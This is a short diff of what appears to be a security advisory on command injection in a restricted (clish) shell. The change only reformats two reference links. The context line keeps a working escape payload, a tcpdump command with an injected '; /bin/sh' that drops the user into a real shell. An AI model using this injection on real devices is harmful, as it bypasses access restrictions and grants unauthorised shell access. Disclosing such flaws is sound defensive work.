@@ -157,5 +157,5 @@ Sanitizing insecure strings by using the type definition from the reference shou
 Paste the following code in the restricted shell to access the real shell:
 `tcpdump enable file filter br0 \ "; /bin/sh -c /bin/sh \"`
 
-[1][http://clish.sourceforge.net/]
-[2][https://www.owasp.org/index.php/Command_Injection]
+[1]: http://clish.sourceforge.net/
+[2]: https://www.owasp.org/index.php/Command_Injection
